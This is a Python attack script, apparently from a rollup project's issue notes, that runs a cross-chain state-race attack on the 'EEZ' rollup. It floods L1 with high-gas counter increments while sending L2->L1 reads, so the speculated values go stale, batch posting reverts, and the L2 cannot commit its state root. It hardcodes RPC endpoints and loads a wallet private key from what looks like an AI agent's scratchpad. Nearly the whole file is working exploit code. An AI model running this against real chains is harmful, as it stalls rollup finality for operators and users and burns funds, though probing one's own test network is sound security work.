#!/usr/bin/env python3
"""Cross-chain state-race attack: block the L2 from committing to L1.

Idea (per the EEZ sync model):
  * An L2->L1 call that reads/mutates an L1 counter forces the composer to
    SPECULATE the L1 return value when it builds the L2 block, committing that
    value into the block's rolling hash.
  * A parallel, high-gas, pure-L1 transaction mutates the same counter FIRST.
  * When the batch executes on L1, the counter's value differs from what was
    speculated, so the rolling hash no longer matches and postAndVerifyBatch
    reverts. The L2 block cannot be committed.

Repeat continuously and the L2's L1 attestation stalls: `uncommitted` grows and
`last L1 state root` ages, even though the L2 keeps producing blocks.

Run:  python .issues/attack_stateroot_race.py [duration_seconds]
"""
import json
import sys
import threading
import time

sys.path.insert(0, "/home/ubuntu/code/EEZtest")
from eth_utils import to_checksum_address, keccak

from eeztest.config import Config
from eeztest.contracts import compile_all
from eeztest.eez import Eez
from eeztest.rpc import ChainClient

DURATION = int(sys.argv[1]) if len(sys.argv) > 1 else 180

CFG = {
    "instance_name": "attack-7331",
    "l1": {"rpc": "http://37.27.238.19:8545", "chain_id": 7331,
           "xchain_front": "http://65.109.26.16:18999", "min_gas_price_wei": 2_000_000_000},
    "l2": {"rpc": "http://65.109.26.16:18688", "chain_id": 6290,
           "xchain_front": "http://65.109.26.16:18998", "min_gas_price_wei": 1000},
    "eez": {"rollup_id": 1, "registry": "0x0165878a594ca255338adfa4d48449f69242eb8f",
            "ccm_l2": "0x4200000000000000000000000000000000000007", "crosschain_gas_limit": 400_000},
    "wallet": {"private_key": json.load(open(
        "/tmp/claude-1000/-home-ubuntu-code-testsync-rollups/"
        "2217d3e7-1d99-42d2-a8be-15fd18a12826/scratchpad/eez2_wallet.json"))["privateKey"]},
    "workers": {},
}

REG = "0x0165878a594ca255338adfa4d48449f69242eb8f"


def state_root_age(l1: ChainClient) -> tuple[float, int]:
    """(seconds since last postAndVerifyBatch, uncommitted-ish head delta) via L1 scan."""
    # last state-root commit: newest tx to the registry with the postAndVerifyBatch selector
    head = l1.block_number()
    sel = "0x8b1a095a"
    newest = None
    for bn in range(head, max(0, head - 60), -1):
        try:
            b = l1.call("eth_getBlockByNumber", [hex(bn), True])
        except Exception:
            continue
        if not b:
            continue
        for t in b.get("transactions", []):
            if (t.get("to") or "").lower() == REG and (t.get("input") or "").startswith(sel):
                newest = int(b["timestamp"], 16)
                break
        if newest:
            break
    age = (time.time() - newest) if newest else -1
    return age, head


def main() -> None:
    cfg = Config.from_dict(CFG)
    l1 = ChainClient(cfg.l1, cfg.private_key)
    l2 = ChainClient(cfg.l2, cfg.private_key)
    eez = Eez(cfg, l1, l2)
    me = l1.address
    print(f"attacker {me}")
    print(f"  L1 bal {l1.balance(me)/1e18:.3f}  L2 bal {l2.balance(me)/1e18:.3f}")

    # ── deploy the L1 counter ───────────────────────────────────────────────
    art = compile_all()["Counter"]
    from eeztest.rpc import predict_create_address
    n = l1.next_nonce()
    counter = to_checksum_address(predict_create_address(me, n))
    hc = l1.send(to=None, data=art.bytecode, gas=600_000, nonce=n, endpoint=cfg.l1.rpc)
    rc = l1.wait_receipt(hc, timeout=120)
    print(f"\nL1 Counter deployed at {counter}  (status {rc.status if rc else '—'})")
    if not l1.has_code(counter):
        print("counter has no code; abort"); sys.exit(1)

    inc = art.encode_call("increment")
    read = "0x" + keccak(b"counter()").hex()[:8]   # view getter; exact committed return

    def read_counter() -> int:
        r = l1.eth_call(counter, "0x" + keccak(b"counter()").hex()[:8])
        return int(r, 16)

    print(f"counter starts at {read_counter()}")

    # ── baseline: one clean L2->L1 increment, no interference ───────────────
    print("\n=== baseline: clean L2->L1 increment (no race) ===")
    pre_age, _ = state_root_age(l1)
    pre = read_counter()
    h, ref = eez.call_l1_from_l2(counter, inc)
    print(f"  L2->L1 tx {h}  via proxy {ref.proxy_address}")
    for _ in range(24):
        time.sleep(5)
        if read_counter() > pre:
            print(f"  counter advanced {pre} -> {read_counter()} — cross-chain L2->L1 path works")
            break
    else:
        print("  counter did not advance in 120s (baseline L2->L1 may be broken here)")

    # ── attack: race the counter ────────────────────────────────────────────
    print(f"\n=== attack: state-race for {DURATION}s ===")
    stop = threading.Event()
    stats = {"l1_inc": 0, "l1_err": 0, "l2_calls": 0, "l2_err": 0}

    def hammer_l1():
        """Continuously increment the L1 counter at high gas so any speculated
        read is stale by the time a batch executes."""
        gp = max(l1.gas_price() * 50, 500 * 10**9)   # 500 gwei — vastly outbid the 10-gwei batch
        while not stop.is_set():
            try:
                l1.send(to=counter, data=inc, gas=120_000, gas_price=gp, endpoint=cfg.l1.rpc)
                stats["l1_inc"] += 1
            except Exception:
                stats["l1_err"] += 1
                l1.reset_nonce()
            time.sleep(0.5)

    def drive_l2():
        """Keep feeding the composer L2->L1 reads of the racing counter."""
        while not stop.is_set():
            try:
                eez.call_l1_from_l2(counter, read)     # commit an exact read of counter()
                stats["l2_calls"] += 1
            except Exception:
                stats["l2_err"] += 1
            time.sleep(2)

    # One flood thread at ~2 writes/s (down from two): still keeps a poisoned read
    # perpetually invalid, but ~28 ETH over 11 min instead of ~56 — within budget.
    threads = [threading.Thread(target=hammer_l1, daemon=True),
               threading.Thread(target=drive_l2, daemon=True)]
    for t in threads:
        t.start()

    t0 = time.time()
    base_age, _ = state_root_age(l1)
    max_age = base_age
    l2_head0 = l2.block_number()
    print(f"  t=0  state-root age at start: {base_age:.0f}s   L2 head {l2_head0}")
    while time.time() - t0 < DURATION:
        time.sleep(20)
        age, l1head = state_root_age(l1)
        l2head = l2.block_number()
        max_age = max(max_age, age)
        blocked = "  <-- BLOCKED" if age > 90 else ""
        print(f"  t={time.time()-t0:5.0f}s  state-root age={age:6.0f}s  L2 head +{l2head-l2_head0}  "
              f"L1 inc={stats['l1_inc']} L2 calls={stats['l2_calls']}{blocked}")
    stop.set()
    time.sleep(2)

    print("\n=== RESULT ===")
    print(f"  L1 increments fired : {stats['l1_inc']} (errors {stats['l1_err']})")
    print(f"  L2->L1 calls fired  : {stats['l2_calls']} (errors {stats['l2_err']})")
    print(f"  max state-root age  : {max_age:.0f}s")
    final_age, _ = state_root_age(l1)
    print(f"  final state-root age: {final_age:.0f}s")
    print(f"  VERDICT: {'L2 COMMITMENT BLOCKED (state-root age exceeded 90s under attack)' if max_age > 90 else 'chain kept committing — attack did not block it'}")


if __name__ == "__main__":
    main()
